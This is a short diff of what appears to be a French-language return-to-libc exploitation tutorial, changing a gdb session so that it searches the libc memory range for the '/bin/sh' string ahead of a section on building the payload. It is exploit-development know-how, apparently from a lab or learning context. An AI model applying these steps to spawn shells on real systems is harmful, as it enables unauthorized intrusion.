@@ -88,7 +88,7 @@ $2 = 0xf7e5eb70
 # 3. Adresse de la chaîne "/bin/sh"
 (gdb) info proc mappings
 # On repère la plage de la libc : 0xf7e2c000 à 0xf7fcc000
-(gdb) q
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
 $3 = 0xf7f897ec
 
 5. CONSTRUCTION DU PAYLOAD
